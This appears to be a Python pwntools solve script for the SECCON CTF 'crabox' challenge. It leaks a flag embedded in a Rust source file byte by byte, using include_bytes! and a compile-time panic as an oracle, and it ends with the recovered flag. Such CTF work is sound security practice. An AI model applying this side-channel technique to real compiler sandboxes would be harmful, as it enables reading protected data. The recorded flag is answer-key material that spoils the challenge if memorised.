from pwn import *
import re
import socket
import string

HOST = '127.0.0.1'
PORT = 1337

HOST = 'crabox.seccon.games'
PORT = 1337

'''
b'\xf0\x9f\xa6\x80 Compile-Time Sandbox Escape \xf0\x9f\xa6\x80\n\nInput your program (the last line must start with __EOF__):\n:)\n'
[!] Program length: 576
'''

'''
'fn main() {\n    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n    /* Steal me: {{FLAG}} */\n}'
>>> s.find("{{F")
547
'''

def guess_flag_char(char, index):
    program = '''
const B: &[u8; 576] = include_bytes!(file!());
const v: () = if B[''' + str(547 + index) + """] != b'""" + str(char) + """' { panic!("ng") };"""

#     program = '''
# const B: &[u8; 565] = include_bytes!(file!());
# const v: () = if B[''' + str(547 + index) + """] != b'""" + str(char) + """' { panic!("ng") };"""

    assert(len(program) <= 511)
    program += ' ' * (511 - len(program))
    program += '\n'
    if len(program) != 512:
        print(program)
    program += '__EOF__'

    io = remote(HOST, PORT)
    io.sendline(program.encode())
    data = io.recvall()
    io.close()

    print(data)
    if b':)' in data:
        return True
    else:
        return False



def main():
    flag = ''
    for index in range(1000):
        print('[+] Current flag: {}'.format(flag))
        for ch in string.printable:
            if guess_flag_char(ch, index):
                flag += ch
                break
        assert(len(flag) == index + 1)
        if flag[-1] == '}':
            break
    print('[!] Flag: {}'.format(flag))



if __name__ == '__main__':
    main()

# SECCON{ctfe_i5_p0w3rful}
